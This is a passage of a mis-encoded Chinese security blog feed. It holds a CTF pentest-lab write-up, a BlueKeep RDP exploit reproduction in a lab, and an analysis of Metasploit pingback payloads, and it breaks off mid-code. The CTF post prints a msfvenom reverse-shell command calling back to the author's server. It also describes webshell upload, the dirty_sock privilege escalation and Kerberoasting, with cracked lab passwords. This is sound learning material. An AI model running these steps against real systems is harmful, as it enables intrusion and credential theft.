    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-10 01:20:33<br><img src="/wallpaper/thumb-1920-584470.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>scanfå¤§å¸ˆå‚…çš„é¢˜ï¼Œtql..orz<br>è¢«hayaå¸ˆå‚…å¸¦ç€åšäº†è€åŠå¤©ï¼Œæ‰è‚å‡ºæ¥ç¬¬ä¸€é¢˜ï¼Œç„¶ååé¢å› ä¸ºå¤ªå¤šäººæ…å±æ²¡åŠæ³•åšäº†..</p><p>ç°åœ¨æ¯”èµ›ç»“æŸäº†ï¼Œè¶ç€å¸ˆå‚…è¿˜æ²¡å…³ç¯å¢ƒå¤ç›˜ä¸€ä¸‹</p><h2 id="0x01-Step-1"><a href="#0x01-Step-1" class="headerlink" title="0x01 Step 1"></a>0x01 Step 1</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8B6AEA77-BC71-4524-AB3E-03682BE9AA2B.png" alt="bfb092323f5fb9388df881f67790c5fa"></p><p>å…¥å£ip:<br>ç®€å•æ¢æµ‹ä¸€ä¸‹ç«¯å£ï¼š47.52.129.242<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F08CCB53-2BEA-45DC-B0DA-4F2BC882EB53.png" alt="dd0b6c61e3921224e34a939bed7af5db"></p><p>å‘ç°å¼€äº†ProFTPD 1.3.5</p><p>ç¨å¾®googoleä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶æ‹·è´æ¼æ´ï¼ˆCVE-2019-12815ï¼‰</p><p>ä½¿ç”¨ncftp è¿æ¥<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0E212818-FD0C-4FF0-A6FC-FB489AA4123A.png" alt="926bccdda31f92e2756d6d79922d0b74"></p><p>å…¶å®è¿˜æ˜¯è›®å¡çš„â€¦<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F29833FD-DAE3-44BF-B4D4-D52E08039466.png" alt="13ec778cbd22acd27d61aa2cddf1bf40"></p><p>ç„¶åæˆ‘ä»¬æŠŠmsgæ–‡ä»¶å†™å…¥åˆ°patrilic.phpé‡Œ</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/26BF5290-F82E-4BF0-83C7-4919069AB43D.png" alt="c33df3cd9728cf93922824154027574a"></p><blockquote><p>PS: å¥½åƒWindowsè¿æ¥éœ€è¦å¯†ç ï¼Œç„¶åTOP1000å­—å…¸å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œç”¨æˆ·ftp å¯†ç  mustang</p></blockquote><p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ª<code>www-data</code>æƒé™çš„webshellï¼Œå…ˆåå¼¹ä¸€ä¸ªshellåˆ°æˆ‘ä»¬çš„vpsä¸Š</p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬ï¼š<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/675A849D-69D2-4096-86FB-E966A8C08EB9.png" alt="82bb6955321a5530c3bf9a12277d6fb0"></p><p>okï¼Œä½¿ç”¨<code>msfvenom</code>ç”Ÿæˆä¸€ä¸ªx64çš„linux reverse_shellæœ¨é©¬ï¼Œæ”¾åœ¨webç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload  linux/x64/shell_reverse_tcp LHOST=45.xx.xx.xx LPORT=7778 -f elf -o /home/wwwroot/default/test.elf</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨file_put_contents + file_get_contentså°†æ–‡ä»¶ä¸‹è½½åˆ°/tmpç›®å½•ä¸‹<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/20EF13D9-B920-4C9F-84FE-FCD4AF273E9E.png" alt="d6ff181f69ac7604fe5c637ac30deb64"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0EF41EEA-CA1B-43E0-871F-38F60DB606F6.png" alt="954843a51658096b9c4c38ff57e7b6fa"></p><p>ç„¶åç»™ä¸ªæ‰§è¡Œæƒé™ å°±å¯ä»¥å¼¹å›shelläº†</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/123A148B-B113-4DD5-AFCB-75FA44314F4F.png" alt="bbf5cad7c673e608440379b7ff6ff091"></p><p>ç„¶åç»™å®ƒå‡çº§ä¸€ä¸‹ï¼Œææˆmeterpreter session<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/E1D7AACB-FC79-43DA-8B32-CEB073860A57.png" alt="aa30ede9c3f038c1e9cd13dbca800839"></p><p>ææƒçš„è¯ï¼Œå› ä¸ºç»™äº†æç¤ºå˜›ï¼Œsnapï¼Œä¹Ÿèƒ½æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°æ˜¯å¹´åˆé‚£ä¸ªæ¼æ´</p><p>CVE-2019-7304<br>githubä¸Šä¹Ÿæœ‰exp:<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">https://github.com/initstring/dirty_sock</a></p><p>ç„¶åå› ä¸ºæœ‰å¸ˆå‚…æ…å±..å°±æŠŠsnapå‡çº§äº†ï¼Œå¯¼è‡´æ²¡æç¤ºçš„æ—¶å€™ï¼Œå¾ˆå¤šå¸ˆå‚…ä¸€è„¸æ‡µé€¼<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8C6E7428-C46F-428F-86BA-21E122C7B106.png" alt="e1f33edcc2a556e7ed15a6c1bae0be25"></p><p>ä¸è¿‡snapæ˜¯åœ¨18.04çš„ç‰ˆæœ¬ä¹‹åæ‰ä¼šè‡ªå¸¦ï¼Œæ‰€ä»¥åœ¨è¿™å«Œç–‘è¿˜æ˜¯æ¯”è¾ƒå¤§çš„</p><p>æˆ‘ä»¬å…ˆç”¨pythonå¾—åˆ°ä¸€ä¸ªåŠäº’å¼shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/19F30D2A-BF2B-4F89-91CB-9CB7DCE38BC9.png" alt="b95386722c3c3a34961c7b8528cc83c4"></p><p>å¯ä»¥çœ‹åˆ°å…¶å®ï¼Œè¿™ä¸ªexpä¼šç”Ÿæˆä¸€ä¸ª<code>dirty_sock</code>ç”¨æˆ·ï¼Œå¹¶ä¸”å¯†ç å°±æ˜¯<code>dirty_sock</code><br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0F9D34D8-20D2-443B-B50D-33EC15E10CF4.png" alt="9f889bd4914086f7264e6899039dd6ec"></p><p>Get the flag: N1CTF{ImpOrtant_P0int3_4de0e}</p><h2 id="0x02-Step-2"><a href="#0x02-Step-2" class="headerlink" title="0x02 Step 2"></a>0x02 Step 2</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/61C9F7F2-E91B-47E0-B3D4-B85F65BBEC53.png" alt="7a4b924e2833d1fcb3650d3014e8dcd4"></p><p>psè·å–è¿›ç¨‹åˆ—è¡¨<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0B6BE438-DB34-4FA6-AFFC-3A0377150FB8.png" alt="131de33d1136f8bf8d9186506a6e97f0"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/77BB4EC0-21B9-42AD-9EF3-38792F5D2DEC.png" alt="97c856f03e9a74098462c37adcfc9e6f"></p><p>å¯ä»¥çœ‹åˆ°devä¸Šæœ‰ä¸€ä¸ªåŸŸç”¨æˆ·<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/2481FCC8-41D6-40BA-BC15-7E4AC208D4ED.png" alt="cd1e782d5470e4ef6206fffc7b86bbc6"></p><p>ä½¿ç”¨meterpreteråŠ è½½ä¸€ä¸ªpowerview.ps1æ¥å¸®åŠ©æˆ‘ä»¬ä¿¡æ¯æœé›†</p><p>æ³¨æ„åœ¨ç°åœ¨çš„branché‡Œæ˜¯æ²¡æœ‰Get-DomainUserç­‰å‡½æ•°çš„ï¼Œä½¿ç”¨<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906</a></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/545FAF70-7345-4667-8704-FB4244EBA3D2.png" alt="03048e40dac0352715cfbd422a7a75b6"></p><p>ä»¥ä¸‹çœç•¥1000å­—(å°±æ˜¯å¸¸è§„çš„Get-DomainUserç­‰è¿›è¡Œæœé›†)</p><p>é€šè¿‡ä¿¡æ¯æœé›†ï¼Œæˆ‘ä»¬è·å–åˆ°äº†å­˜åœ¨ä¸€ä¸ªbackup Server<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/A6F837F7-5B9D-4222-8D72-6860DE27F023.png" alt="e7ef96141c9817a0d3369e74910e1a32"></p><p>è°ƒç”¨<code>Invoke-Kerberoast</code>è·å–SPNå¯†æ–‡<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/4A0FA7B5-A860-4CEA-BF81-7ED94637DF8B.png" alt="99c1cfebd9372ddf839cd407ca4099d9"><br>è§£å¯†ï¼š P@ssword123</p><p>ç„¶ååé¢å°±æ˜¯çº¦æŸå§”æ´¾ï¼Œææƒæ‹¿åˆ°\backup.n1ctf2019.lab\backupfile\DCServerçš„è®¿é—®æƒé™</p><p>é‡Œé¢å­˜æœ‰æ³¨å†Œè¡¨å¤‡ä»½ï¼Œä½¿ç”¨impacketå¥—ä»¶è§£å¯†åæ‹¿åˆ°æœ¬åœ°ç®¡ç†å‘˜hash</p><p>ç„¶åé“¶ç¥¨æ®ï¼Œé‡‘ç¥¨æ®ï¼Œæ‹¿åˆ°DCæƒé™ï¼Œæœ€åæ‹¿åˆ°åŸŸç®¡ç†å‘˜æ¡Œé¢ä¸Šçš„flag</p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>å› ä¸ºåé¢éš§é“å®åœ¨æ˜¯å¤ªä¸ç¨³å®šäº†,sessionç–¯ç‹‚æ‰,ä¸€ç›´åœ¨88è¿™å°æœºå­ä¸Šè½¬æ‚ <br>è™½ç„¶å¥½åƒå°±æˆ‘ä¸€ä¸ªäººåœ¨å¼„<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/9359A854-337E-4AB2-BAE2-166F58C570AF.png" alt="91d5a2c55d9806198151c414dd240769"></p><p>vultrçœŸæƒ¨å•Š..</p><p>ç„¶ååé¢çš„çº¦æŸå§”æ´¾ï¼Œå®åœ¨æ˜¯ä¸æ€ä¹ˆç†Ÿæ‚‰ï¼Œè¿˜æ˜¯ç»éªŒå¤ªå°‘..</p><p>æœ€åå®åè†œä¸€æ³¢<code>scanf</code>å¸ˆå‚…ï¼Œä»¥åŠå¸¦æˆ‘é£çš„<code>haya</code>å¸ˆå‚…ï¼Œorz</p><p>å¥‰ä¸Šå®˜æ–¹wpï¼š<br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md" target="_blank" rel="noopener">https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md</a></p><p>Nu1Lå¤ªå¼ºäº†ï¼Œ ä¹Ÿæ„Ÿè°¢ä¸€æ³¢scanfå¸ˆå‚…å¸¦æ¥è¿™ä¹ˆæœ‰è¶£çš„é¢˜ç›®ï¼ˆä¸è¿‡å¦‚æœæ²¡äººæ…å±çš„è¯è¯´ä¸å®šèƒ½è‚å‡ºæ¥step2 hhhhï¼‰</p><p>æœ€åè¿˜æ˜¯è§‰å¾—ï¼Œè¿‡æ®µæ—¶é—´å¥½å¥½ç ”ç©¶ä¸€æ³¢kerberosï½ï¼Œè¶ç€è¿˜åœ¨å­¦æ ¡hhhh(kekeoéƒ½æ²¡ç”¨è¿‡çš„æˆ‘ å¤ªèœäº†ï¼‰</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-10 01:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-584470.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="n1ctf-pentest" scheme="http://patrilic.top/tags/n1ctf-pentest/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ</title>
    <link href="http://patrilic.top/2019/09/09/CVE-2019-0708%20RDP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/09/09/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ/</id>
    <published>2019-09-09T09:03:55.000Z</published>
    <updated>2019-09-09T12:07:38.289Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-09 17:03:55<br><img src="/wallpaper/8.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>RDPæœåŠ¡çš„æ¼æ´ï¼Œé™¤äº†ä¹‹å‰çš„<code>ms12-020</code>(è¡¥ä¸å·ï¼š<code>KB2621440</code>)ï¼Œå½±å“æœ€è½°åŠ¨çš„ä¹Ÿå°±æ˜¯è¿™æ¬¡çš„<code>bluekeep</code>äº†ï¼Œhwä¹‹å‰çˆ†å‡ºçš„æ¼æ´ï¼Œå‰ä¸¤å¤©<code>rapid7</code>å®˜æ–¹åœ¨githubä¸Šä¼ äº†æœ€æ–°çš„expï¼Œå¯ç›´æ¥åˆ©ç”¨ã€‚</p><p><strong>å½±å“èŒƒå›´</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows 7</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2008</span><br><span class="line"></span><br><span class="line">Windows Server 2003</span><br><span class="line"></span><br><span class="line">Windows XP</span><br></pre></td></tr></table></figure></p><h2 id="0x01-æ¼æ´å¤ç°"><a href="#0x01-æ¼æ´å¤ç°" class="headerlink" title="0x01 æ¼æ´å¤ç°"></a>0x01 æ¼æ´å¤ç°</h2><p>ç›®å‰éœ€è¦æ›¿æ¢expåŒ…ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯MacOSç¯å¢ƒï¼ˆexpåŒ…åˆ°å¤„éƒ½æœ‰ï¼Œå°±ä¸æ”¾äº†)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cve_2019_0708_bluekeep_rce.rb æ·»åŠ åˆ° /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">rdp.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/lib/msf/core</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/dp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure></p><p>æ›¿æ¢å®Œæˆä¹‹åä½¿ç”¨<code>reload_all</code>åŠ è½½æ¨¡å—<br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/6BC0D3A6-C794-4D55-A0DA-DD40C87198D4.png" alt="5bd7750bf0e644937edf8c6a1474e664"></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨4ä¸ªtargetsï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯VMWareï¼Œæ‰€ä»¥é€‰target 3</p><p><strong>Windows 7 ultimate SP1</strong><br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/FFEE06BD-258D-411F-AA56-C7D79F037E53.png" alt="e147fe734985ded3f8137442b883e5ec"></p><p>ä½†æ˜¯å…³æ‰sessionåé‡æ–°æ‰“ç¬¬äºŒæ¬¡ï¼Œå°±è“å±äº†<br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/3DFEC667-3E43-47DD-B13E-C09010C459CA.png" alt="2342e02c78bd2677c4bbcc38523587d8"></p><p><strong>Windows Server 2008 R2</strong> ï¼Œæœç„¶è“å±äº†2333<br><img src="/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ.resources/CCAF6F35-964F-47EB-B380-50B4BC89BD17.png" alt="a38d2f7b12e397248a5dfc1cdc8c9d37"></p><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>å¬å¤§ä½¬è¯´ï¼Œæ ¸å¿ƒä»£ç è¿˜æ²¡æ”¾å‡ºæ¥ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°é™¤äº†08çš„ä¸èƒ½æˆåŠŸï¼Œå…¶ä»–éƒ½è¿˜okï¼Œï¼ˆå¬è¯´éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼‰</p><h2 id="0x03-ç›¸å…³é“¾æ¥ğŸ”—"><a href="#0x03-ç›¸å…³é“¾æ¥ğŸ”—" class="headerlink" title="0x03 ç›¸å…³é“¾æ¥ğŸ”—"></a>0x03 ç›¸å…³é“¾æ¥ğŸ”—</h2><p><a href="https://www.freebuf.com/news/203584.html" target="_blank" rel="noopener">https://www.freebuf.com/news/203584.html</a><br><a href="https://www.freebuf.com/vuls/205380.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/205380.html</a><br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-09 17:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/8.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="BlueKeep" scheme="http://patrilic.top/tags/BlueKeep/"/>
    
  </entry>
  
  <entry>
    <title>MSF Pingback Payloads</title>
    <link href="http://patrilic.top/2019/09/06/Payloads/"/>
    <id>http://patrilic.top/2019/09/06/Payloads/</id>
    <published>2019-09-05T16:47:46.000Z</published>
    <updated>2019-09-16T06:42:00.915Z</updated>
    
    <content type="html"><![CDATA[<p><a name="JSO7R"></a></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><blockquote><p>æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼Œæ–‡ç« é“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/6268" target="_blank" rel="noopener">https://xz.aliyun.com/t/6268</a></p></blockquote><p>ä»Šå¤©æ—©ä¸ŠRapid7cnçš„å…¬ä¼—å·æ›´æ–°äº†ä¸€ç¯‡æ–‡ç« ï¼Œç„¶åå°±è¢«ç¾¤é‡Œçš„å¤§å¸ˆå‚…ä»¬è½¬å‘äº†å¥½å‡ é233ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿæƒ³ç€åˆ†æä¸€ä¸‹</p><p><a href="https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA</a></p><p>å®˜ç½‘ï¼š <a href="https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/" target="_blank" rel="noopener">https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/</a><br><a name="mXsId"></a></p><h2 id="0x01-pingback"><a href="#0x01-pingback" class="headerlink" title="0x01 pingback"></a>0x01 pingback</h2><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567694251815-6a249db8-4ac8-4a27-b999-49869d8138d5.png" alt="image.png">è¿™æ¬¡ä¸€å…±æ›´æ–°äº†10ä¸ªpingback payload, è‡³äºä»€ä¹ˆæ˜¯pingbackï¼Œå…¶å®msfå®˜æ–¹åœ¨githubå·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†<br><a href="https://github.com/rapid7/metasploit-framework/pull/12129" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/12129</a></p><blockquote><p>Pingback payloads are designed to provide a limited-functionality payload to verify an exploit has worked. <strong>It does not provide a shell of any kind.</strong> A pingback payload creates a â€œrandomâ€ UUID value (separate from the payload UUID) that is written to the Metasploit database along with other data. When executed on target, the payload sends back that UUID to verify that the exploit worked, but nothing else. When Framework receives that UUID, we verify the target is vulnerable to the exploit without loading an interactive shell.<br>This prevents traditional [W/M]ITM attacks or someone sniffing the traffic for information, as the UUID itself means nothing to a listener, and without further execution, the session itself is not particularly valuable to an attacker.</p></blockquote><p>ç®€å•æ¥è¯´æ„Ÿè§‰å…¶å®å°±æ˜¯ï¼ŒAVå¯¹msfä¹‹å‰çš„å¸¸è§„reverse_shellä¼šè¿›è¡Œæ‹¦æˆªï¼Œå¯¼è‡´æˆ‘ä»¬å¹¶ä¸èƒ½å¾ˆæ¸…æ¥šçš„çŸ¥é“ç›®æ ‡æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼Œç„¶åè¿™ä¸ªpayloadå°±å®Œå…¨ä¸ä¼šäº§ç”Ÿäº¤äº’å¼shellï¼Œè€Œåªæ˜¯è¿”å›ä¸€ä¸ªUUIDï¼Œèƒ½è®©æˆ‘ä»¬çŸ¥é“poc/expæ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œç„¶åç›®æ ‡æ˜¯å¦å­˜åœ¨å½“å‰æ¼æ´ï¼Œè€Œä¸å¿…æ‹…å¿ƒè¢«ä¸­é—´äººæ”»å‡»æˆ–è€…è¢«æ‹¦æˆª</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567696662682-c96fa1cc-966d-4b06-b19e-2d52f8884ed3.png" alt="image.png"></p><h2 id="0x02-How-to-Use"><a href="#0x02-How-to-Use" class="headerlink" title="0x02 How to Use"></a>0x02 How to Use</h2><p>ç¿»çœ‹ä»£ç ï¼Œæˆ‘ä»¬å‘ç°å®ƒå…¶å®æ˜¯æ¯æ¬¡ç”Ÿæˆä¸€ä¸ªæ–°çš„UUIDï¼Œç„¶åå°†å…¶å‘é€åˆ°ç›®æ ‡ä¸­ï¼Œç„¶åè°ƒç”¨listenerä¸­çš„payloadè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œç„¶åå½“ç¨‹åºè¿›è¡Œ <code>Pingback</code> æ—¶ï¼ŒMSFæ‰“å¼€ä¸€ä¸ªä¼šè¯æ¥æ¥å—UUIDï¼Œæœ€åæ‹¿åˆ°å®Œæ•´UUIDåï¼Œå°±å…³é—­å½“å‰session</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/modules/payloads/singles/ruby/pingback_reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruby_string</span></span></span><br><span class="line">    <span class="keyword">self</span>.pingback_uuid <span class="params">||</span>= <span class="keyword">self</span>.generate_pingback_uuid</span><br><span class="line">    lhost = datastore[<span class="string">'LHOST'</span>]</span><br><span class="line">    lhost = <span class="string">"[<span class="subst">#&#123;lhost&#125;</span>]"</span> <span class="keyword">if</span> Rex::Socket.is_ipv6?(lhost)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"require'socket';"</span> \</span><br><span class="line">      <span class="string">"c=TCPSocket.new'<span class="subst">#&#123;lhost&#125;</span>',<span class="subst">#&#123;datastore[<span class="string">'LPORT'</span>].to_i&#125;</span>;"</span> \</span><br><span class="line">      <span class="string">"c.puts'<span class="subst">#&#123;[[<span class="keyword">self</span>.pingback_uuid].pack(<span class="string">'H*'</span>)].pack(<span class="string">'m0'</span>)&#125;</span>'.unpack('m0');"</span></span><br><span class="line">      <span class="string">"c.close"</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf/base/sessions/pingback.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid_read</span></span></span><br><span class="line">    uuid_raw = rstream.get_once(<span class="number">16</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">unless</span> uuid_raw</span><br><span class="line">    <span class="keyword">self</span>.uuid_string = uuid_raw.each_byte.map &#123; <span class="params">|b|</span> <span class="string">"%02x"</span> % b.to_i() &#125;.join</span><br><span class="line">    print_status(<span class="string">"Incoming UUID = <span class="subst">#&#123;uuid_string&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> framework.db.active</span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        payload = framework.db.payloads(<span class="symbol">uuid:</span> uuid_string).first</span><br><span class="line">        <span class="keyword">if</span> payload.<span class="literal">nil</span>?</span><br><span class="line">          print_warning(<span class="string">"Provided UUID (<span class="subst">#&#123;uuid_string&#125;</span>) was not found in database!"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          print_good(<span class="string">"UUID identified (<span class="subst">#&#123;uuid_string&#125;</span>)"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">rescue</span> ActiveRecord::ConnectionNotEstablished</span><br><span class="line">        print_status(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">      <span class="keyword">rescue</span> =&gt; e</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Can we have a more specific exception handler?</span></span><br><span class="line">        <span class="comment"># Test: what if we send no bytes back?  What if we send less than 16 bytes?  Or more than?</span></span><br><span class="line">        elog(<span class="string">"Can't get original UUID"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Class: <span class="subst">#&#123;e.<span class="keyword">class</span>.name&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Message: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">        elog(<span class="string">"Exception Backtrace: <span class="subst">#&#123;e.backtrace&#125;</span>"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_warning(<span class="string">"WARNING: UUID verification and logging is not available, because the database is not active."</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>option.rb</code> ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°pingbackçš„æ¨¡å—å­˜åœ¨ä¸¤ä¸ªé€‰é¡¹ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span 